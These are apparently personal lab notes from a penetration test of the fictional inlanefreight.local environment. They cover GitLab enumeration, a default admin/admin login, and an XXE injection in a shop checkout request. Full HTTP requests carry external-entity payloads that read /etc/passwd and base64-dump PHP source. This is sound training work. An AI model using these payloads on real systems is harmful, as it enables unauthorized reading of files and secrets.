b.inlanefreight.local

we can register new gitlab standar user and acess the github profile wihtot permited by admins ..
we reister new user `ahmed` and access and access teh profile as the image :
![[Pasted image 20260212145857.png]]
 
from the `http://gitlab.inlanefreight.local/help` we can see the github version `GitLab Community Edition 15.0.0` so it not too old version since there is no exploit for this version 
![[Pasted image 20260212150019.png]]

from the `http://gitlab.inlanefreight.local/explore` we can see an privet projects repositoryes
![[Pasted image 20260212150249.png]]

we can see the reporistory with the name `shopdev2.inlanefreight.local` look like  new privet subdomain 
accessing  ` http://shopdev2.inlanefreight.local/` it form brpwser confirm  it live and exisite 
![[Pasted image 20260212150656.png]]
we will save it in our notes for later check 

 
 
 ## shopdev2.inlanefreight.local
fromthe login password panel
![[Pasted image 20260212150656.png]]
we seccues login with the user `admin` and passowrd `admin`

![[Pasted image 20260212154531.png]]
 
 from `mycart` in  `http://shopdev2.inlanefreight.local/cart.php` we click on  the` Complete Purchase ` and intersept the reqest using burpsuit 
![[Pasted image 20260212160420.png]]
 we  notise an xml elemnts `userid` is reflected, we can inject into it.  
 ```xml
 POST /checkout.php HTTP/1.1
Host: shopdev2.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 153
Origin: http://shopdev2.inlanefreight.local
Connection: keep-alive
Referer: http://shopdev2.inlanefreight.local/cart.php
Cookie: PHPSESSID=aplf4snfsuksjk320d54b7r0g6
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY xml "XML">
]>

<root><subtotal>undefined</subtotal><userid>&xml;</userid></root>
 ```
![[Pasted image 20260212160719.png]]
from `User: XML` we confirm the xml injection attack existe 
now we will use it to `local file read `:
```bash
POST /checkout.php HTTP/1.1
Host: shopdev2.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 183
Origin: http://shopdev2.inlanefreight.local
Connection: keep-alive
Referer: http://shopdev2.inlanefreight.local/cart.php
Cookie: PHPSESSID=aplf4snfsuksjk320d54b7r0g6
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>

<root><subtotal>undefined</subtotal><userid>&company;</userid></root>
```
![[Pasted image 20260212160843.png]]
we sucess read local file via the xml injection 
we can aloso read the web source files , from example the` index.php`
```bash
POST /checkout.php HTTP/1.1
Host: shopdev2.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 218
Origin: http://shopdev2.inlanefreight.local
Connection: keep-alive
Referer: http://shopdev2.inlanefreight.local/cart.php
Cookie: PHPSESSID=aplf4snfsuksjk320d54b7r0g6
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>

<root><subtotal>undefined</subtotal><userid>&company;</userid></root>
```

![[Pasted image 20260212161244.png]]